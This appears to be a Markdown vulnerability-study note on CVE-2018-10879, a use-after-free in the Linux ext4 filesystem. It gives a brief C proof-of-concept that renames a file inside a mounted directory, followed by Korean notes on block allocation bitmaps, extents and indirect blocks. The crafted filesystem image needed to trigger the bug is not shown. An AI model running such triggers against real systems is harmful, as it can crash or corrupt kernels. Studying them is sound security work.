# CVE-2018-10879
### Use After-free detected by KASAN in Ext4

#### **<POC.C>**

```c
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/falloc.h>
#include <linux/loop.h>
static void activity(char *mpoint) {
char *foo_bar_baz;
char *foo_baz;
int err;
err = asprintf(&foo_bar_baz, "%s/foo/bar/baz", mpoint);
err = asprintf(&foo_baz, "%s/foo/baz", mpoint);
rename(foo_bar_baz, foo_baz);
}
int main(int argc, char *argv[]) {
activity(argv[1]);
return 0;
}
```
<br>

### **Comment**

    block 35는 block allocation bitmap으로 사용 된다.

  **Block allocation이란?** <br>

  모든 read-write 파일 시스템들은  파일에 배치할 때 문제가 발생한다. <br>

개별적으로 해결되야할 두가지 문제들이 존재한다. <br>

  - `free Block`을 찾는 과정 <br>
  - 특정 파일의`` 데이터가 저장 되어있는`` 블록을 기억하는 과정 <br>
  
extent는 블록의 range를 첫번째 블록의 숫자와 블록의 range 길이를 명시한다. <br>

대안은 각 블록의 번호를 따로 보관하는 것인데, 보통은 더 많은 공간이 필요하지만 조금 더 간단하다. <br>

그래서 많은 파일 시스템들은 `allocation bitmap`을 사용한다. <br>
파일을 구성하는 블록을 저장하는 전통적인 UNIX방법은 extent를 사용하지 않고 블록 번호 목록을 사용한다.<br>
처음에는 inode 구조에 저장된다.(direct block) 이 공간이 차게 되면 한 블록이 추가 블록 번호를
저장하도록 할당 된다.<br> 이 간접 블록의 블록 번호만 inode구조에 저장된다. <br>
그 공간도 소진될시 이방 법을 반복적으로 적용하여 이중 간접 블록 또는 삼중 간접 블록으로 이어진다.
